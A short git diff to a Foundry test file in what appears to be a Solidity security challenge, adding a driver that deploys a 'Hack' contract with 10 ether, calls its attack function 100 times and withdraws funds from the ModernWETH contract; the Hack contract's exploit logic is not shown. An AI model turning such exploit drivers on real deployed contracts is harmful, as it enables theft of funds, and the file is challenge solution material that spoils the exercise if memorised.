@@ -3,7 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";
-
+import {Hack} from "../src/2_ModernWETH/Hack.sol";
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
@@ -39,9 +39,14 @@ contract Challenge2Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge2Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-
-
+        Hack hack=new Hack{value:10 ether}(address(modernWETH));
+        for(uint i=0;i<100;i++){
+        hack.attack();
+        }
+        
+        hack.attackENDS();
+        modernWETH.withdrawAll();
+        console.log("Whitehat balance:",modernWETH.balanceOf(whitehat));
         //==================================================//
         vm.stopPrank();
 
